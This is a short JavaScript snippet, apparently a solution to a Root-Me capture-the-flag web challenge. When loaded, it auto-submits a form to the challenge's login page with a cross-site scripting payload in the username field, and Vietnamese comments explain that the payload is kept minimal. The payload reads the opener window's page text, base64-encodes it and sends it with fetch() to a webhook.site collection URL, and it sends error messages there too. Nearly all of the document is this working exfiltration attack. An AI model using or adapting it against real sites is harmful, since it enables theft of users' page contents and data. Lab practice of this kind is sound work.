<script>
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'http://challenge01.root-me.org:58003/login';
    form.target = '_self'; 

    const input = document.createElement('input');
    input.name = 'username';
    
    // Payload tối giản, sử dụng dấu phẩy thay vì dấu chấm phẩy và không dùng ngoặc nhọn nếu có thể
    // Ở đây ta dùng try/catch trên 1 dòng duy nhất.
    input.value = `<script>try{fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?d='+btoa(window.opener.document.body.innerText))}catch(e){fetch('https://webhook.site/122cd883-0402-47a8-a264-d10c171c01ce?e='+btoa(e.message))}<\/script>`;

    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
</script>
